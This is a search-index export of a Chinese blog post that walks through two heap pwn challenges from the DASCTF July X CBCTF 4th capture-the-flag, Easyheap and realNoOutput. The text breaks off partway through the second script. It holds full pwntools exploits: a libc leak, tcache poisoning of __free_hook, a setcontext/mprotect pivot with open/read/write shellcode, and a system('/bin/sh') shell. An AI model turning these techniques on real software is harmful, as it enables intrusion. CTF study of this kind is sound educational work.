<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>DASCTF July X CBCTF 4th pwn</title>
      <link href="/2021/08/04/DASCTF%20July%20X%20CBCTF%204th%20pwn/"/>
      <url>/2021/08/04/DASCTF%20July%20X%20CBCTF%204th%20pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前写了一半的ret2dl的博客还没写完，本来准备边写边学。后面发现涉及的东西有些多，所以还是准备彻底理解了再接着写。最近打了安恒的比赛，这里记录和复现一下这场比赛的pwn。</p><h1 id="Easyheap"><a href="#Easyheap" class="headerlink" title="Easyheap"></a>Easyheap</h1><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>我们先分析一下题目，开始看到main函数开始有一些做初始化的函数，可以看到题目开了沙盒，我们来查看一下</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210731105902768.png" alt="ida里发现的沙盒"></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo seccomp-tools dump ./Easyheap </span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210731110022532.png" alt="查看开了什么沙盒"></p><p>可以看到我们是不可以执行execve的，那么就只能使用orw来读取我们的flag了</p><p>我们接着分析几个函数</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210731151445458.png" alt="add"></p><p>发现add这里存在漏洞，<strong>strdup只会根据你输入的长度来确定malloc的大小和nbytes无关，heap_size的大小只和我们输入的大小nbytes有关，而heap_addr指向的堆是由strdup申请来的，其大小和我们输入的字符串长度有关。</strong></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210731151843085.png" alt="show"></p><p>show函数没有什么特殊的，先查看heap里是否有</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210731152046694.png" alt="delete"></p><p>delete也一样没有什么特殊的，清空了指针</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210731152303249.png" alt="edit"></p><p>edit这里有add函数伏笔回收，如果我们在add时<strong>输入的长度大于我们输入字符串长度</strong>，这里我们就可以<strong>overwrite</strong></p><h2 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h2><p>要想泄露libc的地址我们需要先将chunk放入unsortedbin，题目的libc版本是<em>Ubuntu GLIBC 2.27-3ubuntu1.4</em>所以我们需要先<strong>填满tcache</strong>，然后提前申请好两个chunk，将后面的chunk放入unsorted_bin,通过上面heap的overwrite，来查看libc相对偏移。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x90</span>)<span class="comment">#0-6</span></span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x90</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;interval&#x27;</span>)<span class="comment">#9</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">7</span>):</span><br><span class="line">    dele(i)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">un_addr=u64(ru(io,<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;un_addr : &#x27;</span>+<span class="built_in">hex</span>(un_addr))</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804181622718.png" alt="填满tcache"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804182003314.png" alt="overwrite"></p><p>得到我们的libc</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804182401716.png" alt="泄露libc"></p><p>将我们可能需要的偏移全部计算出来</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc.address=un_addr-<span class="number">0x3ebca0</span></span><br><span class="line">success(<span class="string">&#x27;libc.address : &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">malloc_hook=libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;malloc_hook : &#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">free_hook=libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;free_hook : &#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">system_addr=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">set_context=libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br></pre></td></tr></table></figure><p>恢复之前overwrite的chunk，否侧无法从中申请到后面的chunk</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>)</span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804182814206.png" alt="修复chunk"></p><p>我们知道了libc之后现在就可以去<strong>劫持hook</strong>了，我们将之前释放的chunk切割一块出来，再将其放入tcache。接下来再次<strong>通过overwrite来劫持free_hook</strong>，这样free_hook就被放在tcache的链表。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(free_hook)</span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">&#x27;free&#x27;</span>)<span class="comment">#free_hook </span></span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804192601094.png" alt="free_hook被放入tcache"></p><p>成功劫持free_hook之后，由于这里开了沙盒所以需要我们做<strong>orw</strong>，首先我们需要一块可以调用写shellocde的地方，所以需要<strong>调用mprotect函数</strong>，在free_hook这一页添加可执行权限，而做到这个需要采用<strong>setcontent</strong>，我们将free_hook，改写为setcontent，这样我们调用free函数就会调用setcontent。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new_addr =  free_hook &amp;<span class="number">0xFFFFFFFFFFFFF000</span></span><br><span class="line">shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rdi, rdi</span></span><br><span class="line"><span class="string">mov rsi, &#123;&#125;</span></span><br><span class="line"><span class="string">mov rdx, 0x1000</span></span><br><span class="line"><span class="string">mov rax, 0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">jmp rsi</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(new_addr)</span><br><span class="line">edit(<span class="number">1</span>,p64(set_context+<span class="number">53</span>)+p64(free_hook+<span class="number">0x18</span>)*<span class="number">2</span>+asm(shellcode1))</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804194358784.png" alt="free_hook周围值"></p><p>我们再将我们接下来要free的chunk内填上我们需要的值：</p><p>将rsp赋值为我们之前布置好的free_hook+0x18，其指向shellcode，这样setcontent执行完就会跳转到我们的shellcode</p><p>其他的rdi，rsi，rdx，rip，都是为了改写free_hook对应页的权限。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = free_hook+<span class="number">0x10</span></span><br><span class="line">frame.rdi = new_addr</span><br><span class="line">frame.rsi = <span class="number">0x1000</span></span><br><span class="line">frame.rdx = <span class="number">7</span></span><br><span class="line">frame.rip = libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">str</span>(frame))</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804195139417.png" alt="image-20210804195139417"></p><p>接下来当setcontent执行完，指针会跳转到我们free_hook附近写下的shellcode中，<strong>shellcode会调用read函数</strong>，会在我们free_hook页让我们写入shellocode并跳转执行。我们写入一个标准的orw即可。这一部分比较模板化，可以记录下来，以后稍加改造就可以再次使用。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">shellcode2 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax, 0x67616c662f ;// /flag</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, rsp ;// /flag</span></span><br><span class="line"><span class="string">mov rsi, 0 ;// O_RDONLY</span></span><br><span class="line"><span class="string">xor rdx, rdx ;</span></span><br><span class="line"><span class="string">mov rax, 2 ;// SYS_open</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, rax ;// fd </span></span><br><span class="line"><span class="string">mov rsi,rsp  ;</span></span><br><span class="line"><span class="string">mov rdx, 1024 ;// nbytes</span></span><br><span class="line"><span class="string">mov rax,0 ;// SYS_read</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 1 ;// fd </span></span><br><span class="line"><span class="string">mov rsi, rsp ;// buf</span></span><br><span class="line"><span class="string">mov rdx, rax ;// count </span></span><br><span class="line"><span class="string">mov rax, 1 ;// SYS_write</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 0 ;// error_code</span></span><br><span class="line"><span class="string">mov rax, 60</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">sl(io,asm(shellcode2))</span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./Easyheap&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=gdb.debug(&#x27;./test&#x27;,&#x27;b *0x080492D4&#x27;)</span></span><br><span class="line">one_gadget=[<span class="number">0x4f3d5</span>,<span class="number">0x4f432</span>,<span class="number">0x10a41c</span>]</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./Easyheap&#x27;)</span></span><br><span class="line">ru = <span class="keyword">lambda</span> p, x        : p.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x        : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p           : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x        : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>   : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b     : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b    : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t        : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x        : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">fake_size,cont</span>):</span></span><br><span class="line">    sla(io,<span class="string">&#x27;&gt;&gt; :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(io,<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(fake_size))</span><br><span class="line">    sa(io,<span class="string">&#x27;Content:&#x27;</span>,cont)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(io,<span class="string">&#x27;&gt;&gt; :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sla(io,<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(io,<span class="string">&#x27;&gt;&gt; :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sla(io,<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,cont</span>):</span></span><br><span class="line">    sla(io,<span class="string">&#x27;&gt;&gt; :&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sla(io,<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sa(io,<span class="string">&#x27;Content:&#x27;</span>,cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x90</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span>)<span class="comment">#0-6</span></span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#7</span></span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x90</span>)<span class="comment">#8</span></span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">b&#x27;interval&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">7</span>):</span><br><span class="line">        dele(i)</span><br><span class="line">    dele(<span class="number">8</span>)</span><br><span class="line">    edit(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">    show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    un_addr=u64(ru(io,<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    success(<span class="string">&#x27;un_addr : &#x27;</span>+<span class="built_in">hex</span>(un_addr))</span><br><span class="line">    libc.address=un_addr-<span class="number">0x3ebca0</span></span><br><span class="line">    success(<span class="string">&#x27;libc.address : &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">    malloc_hook=libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    success(<span class="string">&#x27;malloc_hook : &#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">    free_hook=libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    success(<span class="string">&#x27;free_hook : &#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">    system_addr=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    set_context=libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">    pause()</span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>)</span><br><span class="line">    edit(<span class="number">7</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(free_hook)</span><br><span class="line">    edit(<span class="number">7</span>,payload)</span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;free&#x27;</span>)<span class="comment">#free_hook 1</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    new_addr =  free_hook &amp;<span class="number">0xFFFFFFFFFFFFF000</span></span><br><span class="line">    shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    mov rsi, &#123;&#125;</span></span><br><span class="line"><span class="string">    mov rdx, 0x1000</span></span><br><span class="line"><span class="string">    mov rax, 0</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    jmp rsi</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(new_addr)</span><br><span class="line">    edit(<span class="number">1</span>,p64(set_context+<span class="number">53</span>)+p64(free_hook+<span class="number">0x18</span>)*<span class="number">2</span>+asm(shellcode1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    frame = SigreturnFrame()</span><br><span class="line">    frame.rsp = free_hook+<span class="number">0x10</span></span><br><span class="line">    frame.rdi = new_addr</span><br><span class="line">    frame.rsi = <span class="number">0x1000</span></span><br><span class="line">    frame.rdx = <span class="number">7</span></span><br><span class="line">    frame.rip = libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0</span>,<span class="built_in">str</span>(frame))</span><br><span class="line"></span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    shellcode2 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0x67616c662f ;// /flag</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, rsp ;// /flag</span></span><br><span class="line"><span class="string">    mov rsi, 0 ;// O_RDONLY</span></span><br><span class="line"><span class="string">    xor rdx, rdx ;</span></span><br><span class="line"><span class="string">    mov rax, 2 ;// SYS_open</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, rax ;// fd </span></span><br><span class="line"><span class="string">    mov rsi,rsp  ;</span></span><br><span class="line"><span class="string">    mov rdx, 1024 ;// nbytes</span></span><br><span class="line"><span class="string">    mov rax,0 ;// SYS_read</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 1 ;// fd </span></span><br><span class="line"><span class="string">    mov rsi, rsp ;// buf</span></span><br><span class="line"><span class="string">    mov rdx, rax ;// count </span></span><br><span class="line"><span class="string">    mov rax, 1 ;// SYS_write</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 0 ;// error_code</span></span><br><span class="line"><span class="string">    mov rax, 60</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    sl(io,asm(shellcode2))</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27832</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">pwn()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><h1 id="realNoOutput"><a href="#realNoOutput" class="headerlink" title="realNoOutput"></a>realNoOutput</h1><h2 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h2><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805165752186.png" alt="add"></p><p>这里我们可以看到，<strong>idx的范围是0-9，一共10个chunk</strong>，我们看看它的size数组和addr数组</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805165924643.png" alt="size&amp;addr"></p><p>发现其<strong>size数组大小为8</strong>，说明数组size大小有问题。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805170703356.png" alt="delete"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805170814359.png" alt="edit"></p><p>我们可以看到上图edit函数里如果不执行if函数仍然可以借助栈里残留的值来进行赋值，从而实现uaf</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805170836608.png" alt="show"></p><h2 id="脚本编写-1"><a href="#脚本编写-1" class="headerlink" title="脚本编写"></a>脚本编写</h2><p>我们先来泄露其libc，由于chunk申请出来的时候没有清理内存，所以我们可以将放在unsorted_bin中的chunk申请出来，得到libc基地址。先填满tcache</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x100</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    dele(<span class="number">7</span>-i)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x10</span>,<span class="string">b&#x27;aaaaaaa&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">un_addr=u64(ru(io,<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;un_addr : &#x27;</span>+<span class="built_in">hex</span>(un_addr))</span><br><span class="line">libc.address=un_addr-<span class="number">0x1ebce0</span></span><br><span class="line">success(<span class="string">&#x27;libc_base : &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805163202933.png" alt="获取基地址"></p><p>再泄露一些我们需要的函数地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;system : &#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">free_hook=libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;free_hook : &#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br></pre></td></tr></table></figure><p>接下来需要的就是劫持free_hook来获取shell</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br></pre></td></tr></table></figure><p>chunk1和2是为了填充tcache，chunk3是为了后面劫持free_hook到system作为参数使用的。</p><p>至于chunk8是为了将chunk0的heap_addr赋值，由于数组越界，我们的chunk8的size会作为chunk0的地址使用。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805205403681.png" alt="addr数组"></p><p>接下来我们就要劫持free_hook了，先将free_hook放在tcache的链表上</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(free_hook))</span><br></pre></td></tr></table></figure><p>这里edit的地址并不是chunk0的而是已经被free的chunk2遗留在栈上的，所以这里构造了一个uaf。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805205633751.png" alt="劫持free_hook"></p><p>剩下的事情就简单了我们将free_hook申请出来，将其修改为system的地址，然后delete之前准备好写有”/bin/sh\x00”的堆块，即可拿取shell。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,p64(system))</span><br><span class="line">dele(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./realNoOutput&quot;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;node4.buuoj.cn&#x27;,27832)</span></span><br><span class="line"><span class="comment">#io=gdb.debug(&#x27;./test&#x27;,&#x27;b *0x080492D4&#x27;)</span></span><br><span class="line"><span class="comment">#one_gadget=[0x4f3d5,0x4f432,0x10a41c]</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./realNoOutput&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;node4.buuoj.cn&#x27;,29826)</span></span><br><span class="line">ru = <span class="keyword">lambda</span> p, x        : p.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x        : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p           : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x        : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>   : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b     : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b    : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t        : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x        : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,cont</span>):</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="built_in">str</span>(idx))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="built_in">str</span>(size))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,cont)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,cont</span>):</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="built_in">str</span>(idx))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,cont)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> 